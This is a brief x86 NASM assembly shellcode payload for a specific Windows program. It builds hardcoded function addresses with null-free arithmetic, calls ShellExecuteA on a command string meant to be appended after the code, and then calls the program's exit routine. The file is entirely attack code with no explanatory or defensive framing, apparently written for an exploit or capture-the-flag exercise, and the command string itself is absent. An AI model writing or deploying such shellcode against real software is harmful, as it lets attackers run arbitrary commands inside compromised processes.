BITS 32

; This function calls ShellExecuteA
; ebx will be 430920h
xor ebx, ebx
add ebx, 0x43
shl ebx, 8
add ebx, 0x09
shl ebx, 8
add ebx, 0x20

; Then call ShellExecuteA("...")
; Shellcode address is EAX
; Command string appended to end
add eax, 0x2A
push eax
call ebx

; Then call 40143Bh:
; 	push 0
; 	call ds:exit
;
xor ebx, ebx
add ebx, 0x40
shl ebx, 8
add ebx, 0x14
shl ebx, 8
add ebx, 0x3B
call ebx
